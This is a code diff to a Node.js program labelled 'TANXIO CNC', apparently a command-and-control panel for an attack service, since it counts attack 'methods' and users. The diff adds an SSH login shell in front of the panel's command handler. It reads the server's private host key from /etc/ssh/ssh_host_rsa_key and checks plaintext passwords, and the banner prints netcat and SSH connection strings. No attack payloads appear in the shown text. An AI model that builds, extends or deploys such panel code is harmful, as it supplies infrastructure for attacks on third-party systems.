@@ -4,9 +4,11 @@ const fs = require('fs');
 const path = require('path');
 const net = require('net');
 const os = require('os');
+const { Server } = require('ssh2');
 
 const app = express();
 const PORT = process.env.PORT || 1337;
+const SSH_PORT = 22;
 
 process.on('uncaughtException', (err) => {
     console.log(`\x1b[31m[✗] exception → ${err.message.toLowerCase()}\x1b[0m`);
@@ -870,9 +872,9 @@ function startNetServer() {
         console.log('  ' + bold(violet('TANXIO CNC') + ' ' + dim('v2.0.0')));
         console.log('');
         console.log('  ' + dim('══════════════════════════════════════════════'));
-        console.log('  ' + dim('  Port   :') + ' ' + cyan(PORT));
         console.log('  ' + dim('  IP     :') + ' ' + cyan(VPS_IP));
-        console.log('  ' + dim('  Connect:') + ' ' + violet('nc ' + VPS_IP + ' ' + PORT));
+        console.log('  ' + dim('  SSH    :') + ' ' + violet('ssh <user>@' + VPS_IP + ' -p 22'));
+        console.log('  ' + dim('  NETCAT :') + ' ' + violet('nc ' + VPS_IP + ' ' + PORT));
         console.log('  ' + dim('══════════════════════════════════════════════'));
         console.log('');
         console.log('  ' + dim('Methods:') + ' ' + state.methods.length + ' | ' + dim('Users:') + ' ' + Object.keys(state.users).length);
@@ -971,4 +973,104 @@ setInterval(() => {
     }
 }, 1000);
 
+function startSSHSERVER() {
+    const sshServer = new Server({ hostKeys: [fs.readFileSync('/etc/ssh/ssh_host_rsa_key')] }, (client) => {
+        let sshUsername = '';
+        console.log('  ' + green('[+]') + ' SSH connection from ' + cyan(client._socket.remoteAddress));
+
+        client.on('authentication', (ctx) => {
+            const user = state.users[ctx.username];
+            if (user && user.password === ctx.password) {
+                sshUsername = ctx.username;
+                ctx.accept();
+            } else {
+                ctx.reject();
+            }
+        }).on('ready', () => {
+            console.log('  ' + green('[+]') + ' SSH user authenticated: ' + cyan(sshUsername));
+
+            client.on('session', (accept, reject) => {
+                const session = accept();
+                
+                session.on('pty', (accept, reject, info) => {
+                    accept();
+                });
+
+                session.on('shell', (accept) => {
+                    const stream = accept();
+                    const userSession = createSession(null);
+                    userSession.user = state.users[sshUsername];
+                    stream.write('\x1Bc');
+                    stream.write('\x1b[41m');
+                    stream.write('\n');
+                    stream.write('  ╔══════════════════════════════════════════════════╗\n');
+                    stream.write('  ║                                                  ║\n');
+                    stream.write('  ║           ██████╗  ██████╗ ██████╗ ██████╗      ║\n');
+                    stream.write('  ║           ██╔══██╗██╔═══██╗██╔══██╗██╔══██╗     ║\n');
+                    stream.write('  ║           ██████╔╝██║   ██║██████╔╝██████╔╝     ║\n');
+                    stream.write('  ║           ██╔═══╝ ██║   ██║██╔══██╗██╔══██╗     ║\n');
+                    stream.write('  ║           ██║     ╚██████╔╝██║  ██║██║  ██║     ║\n');
+                    stream.write('  ║           ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ║\n');
+                    stream.write('  ║                                                  ║\n');
+                    stream.write('  ╚══════════════════════════════════════════════════╝\n');
+                    stream.write('\x1b[0m');
+                    stream.write('\n');
+                    stream.write('  \x1b[38;2;100;220;160m[✓]\x1b[0m Welcome, \x1b[38;2;180;130;255m' + userSession.user.username + '\x1b[0m\n');
+                    stream.write('\n');
+                    stream.write('  Type \x1b[38;2;180;130;255m!help\x1b[0m for available commands\n');
+                    stream.write('\n');
+                    
+                    stream.write(getPrompt(userSession));
+                    stream.prompt = () => stream.write(getPrompt(userSession));
+                    stream.session = userSession;
+
+                    session.on('data', async (data) => {
+                        const input = data.toString();
+                        for (const char of input) {
+                            if (char === '\r' || char === '\n') {
+                                if (stream.session.buffer.trim()) {
+                                    await handleCommand(stream.session, stream.session.buffer.trim());
+                                }
+                                stream.session.buffer = '';
+                                stream.prompt();
+                            } else if (char === '\x7f' || char === '\x08') {
+                                if (stream.session.buffer.length > 0) {
+                                    stream.session.buffer = stream.session.buffer.slice(0, -1);
+                                    stream.write('\b \b');
+                                }
+                            } else if (char === '\x03') {
+                                stream.write('^C\r\n');
+                                stream.session.buffer = '';
+                                stream.prompt();
+                            } else if (char >= ' ' && char <= '~') {
+                                stream.session.buffer += char;
+                                stream.write(char);
+                            }
+                        }
+                    });
+
+                    session.on('eof', () => {
+                        console.log('  ' + yellow('[-]') + ' SSH session closed');
+                    });
+                });
+            });
+
+            client.on('close', () => {
+                console.log('  ' + yellow('[-]') + ' SSH client disconnected');
+            });
+        });
+    });
+
+    sshServer.listen(SSH_PORT, () => {
+        console.log('  ' + dim('SSH Server:') + ' ' + cyan('port ' + SSH_PORT));
+        console.log('  ' + dim('Connect:') + ' ' + violet('ssh <user>@' + VPS_IP + ' -p ' + SSH_PORT));
+        console.log('');
+    });
+
+    sshServer.on('error', (err) => {
+        console.log('  ' + dim('SSH:') + ' ' + red(err.message) + ' (run: sudo apt install openssh && ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key)');
+    });
+}
+
+startSSHSERVER();
 startNetServer();
